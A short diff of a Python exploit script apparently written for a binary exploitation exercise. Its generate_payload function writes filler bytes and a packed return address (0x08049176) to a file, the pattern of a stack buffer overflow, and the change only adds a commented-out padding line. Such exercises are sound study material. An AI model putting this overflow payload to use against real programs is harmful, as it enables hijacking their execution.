@@ -12,6 +12,7 @@ def generate_payload():
     payload += b"BBBB"
     payload += b"CCCC"
     payload += b"DDDD"
+    # payload += b"EEEE"
     payload += pack32(0x08049176)
     f.write(payload)
     f.close()
